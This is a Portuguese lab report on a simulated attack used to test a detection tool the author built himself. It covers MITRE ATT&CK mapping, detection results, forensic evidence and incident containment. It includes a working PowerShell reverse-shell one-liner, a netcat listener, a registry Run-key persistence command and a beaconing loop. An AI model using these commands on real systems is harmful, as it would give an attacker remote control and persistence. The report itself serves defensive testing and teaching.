# 🛡️ Relatório de Simulação de Ataque e Resposta a Incidente
## Teste de Detecção do BlueSentinel em Ambiente Controlado

---

## 📋 Sumário Executivo

Este relatório documenta uma simulação controlada de ataque cibernético, executada em ambiente de laboratório isolado, com o objetivo de validar a capacidade de detecção da ferramenta **BlueSentinel** (desenvolvida pelo autor) contra técnicas reais mapeadas no framework **MITRE ATT&CK**. O teste envolveu o estabelecimento de acesso remoto via reverse shell, criação de mecanismo de persistência no registro do Windows, tentativa de simulação de beaconing, e posterior resposta de contenção. Todas as detecções foram validadas cruzando os alertas da ferramenta com os logs nativos do **Windows Event Viewer**, garantindo evidência forense independente.

**Resultado geral:** a ferramenta detectou com sucesso 2 das 3 técnicas testadas em tempo real (Execução via LOLBin + C2, e Persistência via Registro), com tempo de detecção praticamente instantâneo. Um gap foi identificado na correlação de eventos de beaconing, documentado na seção de Achados.

---

## 🎯 Objetivo

- Validar as capacidades de detecção do BlueSentinel contra técnicas reais de ataque
- Mapear cada detecção às técnicas correspondentes do MITRE ATT&CK
- Cruzar os alertas da ferramenta com logs nativos do Windows (Event Viewer) como evidência forense independente
- Executar um ciclo completo de resposta a incidente: Detecção → Análise → Contenção
- Identificar gaps e oportunidades de melhoria na ferramenta

---

## 🖥️ Ambiente de Teste

| Componente | Detalhe |
|---|---|
| **Máquina Vítima** | Windows 10 Enterprise LTSC 21H2 (VM VirtualBox) |
| **IP Vítima** | 192.168.56.102 |
| **Máquina Atacante** | Kali Linux 2026.2 (VM VirtualBox) |
| **IP Atacante** | 192.168.56.101 |
| **Rede** | Host-Only Adapter (VirtualBox), isolada de internet e da rede real do host |
| **Ferramenta sob teste** | BlueSentinel (Python) |
| **Ferramenta de ataque** | Netcat + PowerShell |
| **Auditoria do Windows** | `auditpol` configurado para todas as categorias + SACL customizada na chave `Run` + PowerShell Script Block Logging habilitado |

### Justificativa da configuração de rede

Optou-se por rede **Host-Only** ao invés de Bridge/NAT para garantir isolamento total do ataque simulado, prevenindo qualquer impacto na rede real do host ou em dispositivos externos.

---

## ⚔️ Cadeia de Ataque (Kill Chain)

```
[1] Acesso Inicial + Execução
        ↓ (PowerShell Reverse Shell)
[2] Persistência
        ↓ (Registry Run Key)
[3] Command & Control
        ↓ (Canal TCP estabelecido)
[4] Tentativa de Beaconing
        ↓ (Conexões repetidas em intervalo)
[5] Resposta e Contenção
        (Bloqueio de IP + Kill de processo + Remoção de persistência)
```

---

## 🗺️ Mapeamento MITRE ATT&CK

| # | Técnica Executada | ID MITRE | Nome da Técnica | Tática |
|---|---|---|---|---|
| 1 | Reverse shell via PowerShell | T1059.001 | Command and Scripting Interpreter: PowerShell | Execution |
| 2 | Abuso de binário legítimo (powershell.exe) | T1218 | System Binary Proxy Execution (LOLBin) | Defense Evasion |
| 3 | Canal de comando remoto via TCP | T1071 | Application Layer Protocol (C2) | Command and Control |
| 4 | Persistência via chave de registro | T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys | Persistence |
| 5 | Conexões repetidas em intervalo fixo | T1071 / T1102 | Beaconing Behavior | Command and Control |

---

## 🧪 Testes Executados

### Teste 1 — Reverse Shell (Acesso Inicial + Execução + C2)

**Comando executado (Windows, via PowerShell):**
```powershell
$c=New-Object Net.Sockets.TCPClient('192.168.56.101',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS> ');$s.Write($sb,0,$sb.Length)}
```

**Listener (Kali):** `nc -lvnp 4444`

**Resultado:** Conexão estabelecida com sucesso. Comando `whoami` executado remotamente confirmou controle total da máquina vítima, retornando `desktop-jsr3f4f\funcionario`.

**Detecção pelo BlueSentinel (simultânea, mesmo evento):**
- 🟣 `[LOLBIN DETECTADO] powershell.exe usando rede 192.168.56.101:4444`
- ⚪ `[CONEXAO] powershell.exe -> 192.168.56.101:4444`
- 🟡 `[PROCESSO SUSPEITO] powershell.exe PID:6968`

**MTTD (Mean Time To Detect):** ~1 segundo (praticamente instantâneo — dentro do ciclo de varredura da ferramenta)

---

### Teste 2 — Persistência via Registro

**Comando executado (via shell reversa já comprometida):**
```powershell
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'BlueSentinelTest2' -Value 'C:\Windows\System32\calc.exe' -PropertyType String -Force
```

**Detecção pelo BlueSentinel:**
```
[PERSISTENCIA] BlueSentinelTest2 -> C:\Windows\System32\calc.exe
```

**Confirmação via Windows Event Viewer (Event ID 4657):**

| Campo | Valor |
|---|---|
| Evento | 4657 — Registry |
| Requerente | DESKTOP-JSR3F4F\Funcionario |
| Objeto | `...\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` |
| Nome do valor | BlueSentinelTest2 |
| Tipo de operação | Novo valor de registro criado |
| Novo valor | `C:\Windows\System32\calc.exe` |
| Processo responsável | `powershell.exe` (PID 0x1b38) |
| Horário | 20/09/2026 23:28:17 |

**Observação técnica:** para que o Event ID 4657 fosse gerado, foi necessário, além de habilitar a categoria de auditoria "Registro" via `auditpol`, configurar manualmente uma **SACL** (System Access Control List) específica na chave `Run`, usando `RegistryAuditRule` via PowerShell — a auditoria genérica de categoria não é suficiente para chaves de registro específicas.

**MTTD:** detectado dentro do primeiro ciclo de varredura após a criação (~5 segundos, intervalo padrão de polling da ferramenta).

---

### Teste 3 — Tentativa de Beaconing

**Comando executado (via shell reversa):**
```powershell
for ($i=0;$i -lt 10;$i++) { Test-NetConnection -ComputerName 192.168.56.101 -Port 4444; Start-Sleep -Seconds 10 }
```

**Resultado:** o BlueSentinel registrou múltiplas entradas de `[CONEXAO]` e `[PROCESSO SUSPEITO]` a cada tentativa, porém **não gerou um alerta específico e consolidado de beaconing**, apesar de a funcionalidade estar descrita na documentação do projeto. Ver seção de Achados.

---

## 🔍 Achados e Observações Técnicas

### ✅ Pontos fortes confirmados
- Detecção multi-camada simultânea (um único evento de ataque gerou 3 alertas complementares: LOLBin, Conexão e Processo Suspeito)
- Tempo de detecção praticamente em tempo real
- 100% de correlação entre alertas do BlueSentinel e evidência forense do Windows Event Viewer

### ⚠️ Falso Positivo Identificado
Durante todo o teste, o BlueSentinel classificou repetidamente a entrada `MicrosoftEdgeAutoLaunch_...` (legítima, criada pelo próprio navegador Edge) como alerta de `[PERSISTENCIA]`, no mesmo nível de severidade da entrada maliciosa criada no teste. **Recomendação:** implementar uma allowlist de processos/entradas conhecidas e legítimas para reduzir ruído e fadiga de alerta (alert fatigue).

### 🔴 Gap de Detecção Identificado
A funcionalidade de "Detecção de Beaconing" listada na documentação do projeto não gerou um alerta dedicado e consolidado durante o teste — cada tentativa de conexão do loop foi tratada como evento individual, sem correlação temporal entre elas. **Recomendação:** implementar lógica de contagem de conexões repetidas para o mesmo destino dentro de uma janela de tempo configurável, disparando um alerta único de "possível beaconing" quando um limiar for atingido.

---

## 🚨 Resposta e Contenção

Seguindo as fases de resposta a incidente (NIST SP 800-61: Contenção, Erradicação e Recuperação):

### 1. Contenção — Bloqueio do atacante
```powershell
New-NetFirewallRule -DisplayName "Block-Attacker-Kali" -Direction Outbound -RemoteAddress 192.168.56.101 -Action Block
New-NetFirewallRule -DisplayName "Block-Attacker-Kali-In" -Direction Inbound -RemoteAddress 192.168.56.101 -Action Block
```

### 2. Erradicação — Encerramento do processo malicioso
```powershell
Stop-Process -Id 6968 -Force
```

### 3. Erradicação — Remoção da persistência
```powershell
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'BlueSentinelTest2' -Force
```

### 4. Recuperação — Validação
```powershell
Get-NetTCPConnection -RemotePort 4444
```
Confirmado: nenhuma conexão ativa remanescente após a contenção.

---

## 📊 Resumo de Métricas

| Métrica | Resultado |
|---|---|
| Técnicas testadas | 3 (Reverse Shell/C2, Persistência, Beaconing) |
| Técnicas detectadas com sucesso | 2 de 3 (66%) |
| MTTD médio (técnicas detectadas) | < 5 segundos |
| Falsos positivos observados | 1 (MicrosoftEdgeAutoLaunch) |
| Fontes de evidência cruzadas | 2 (BlueSentinel + Windows Event Viewer) |
| Tempo total de contenção pós-decisão | < 1 minuto |

---

## 🎓 Conclusão

O teste demonstrou que o **BlueSentinel** é capaz de detectar, em tempo real, técnicas realistas de comprometimento inicial e persistência, com alta fidelidade quando validado contra logs nativos do Windows. A ferramenta se mostra especialmente forte na detecção correlacionada de múltiplos indicadores simultâneos (LOLBin + Conexão + Processo). Os gaps identificados — ausência de allowlist e falta de correlação de beaconing — são pontos claros de evolução para versões futuras, já mapeados no roadmap do projeto.

Este exercício também reforçou, na prática, a importância de configurar corretamente a auditoria nativa do Windows (Event IDs 4688, 4657, 4104) como camada complementar de qualquer ferramenta de detecção customizada — nenhuma ferramenta substitui a visibilidade granular oferecida pelos logs do sistema operacional.

---

## 🔧 Próximos Passos

- [ ] Implementar allowlist de processos legítimos conhecidos no BlueSentinel
- [ ] Implementar correlação de eventos para detecção consolidada de beaconing
- [ ] Repetir o teste com Event ID 4104 (PowerShell Script Block Logging) para captura do código-fonte exato executado
- [ ] Testar detecção de LOLBins adicionais (mshta.exe, rundll32.exe) isoladamente
- [ ] Testar cenário de exfiltração simulada de dados

---

## 👨‍💻 Autor

**Iago dos Santos**
Estudante de Defesa Cibernética | Blue Team & SOC
Certificações: Fortinet NSE 1 & 2, Cisco Cybersecurity

---

*Este relatório foi produzido em ambiente de laboratório isolado, sem impacto em sistemas de produção ou de terceiros, exclusivamente para fins educacionais e de validação de ferramenta própria.*
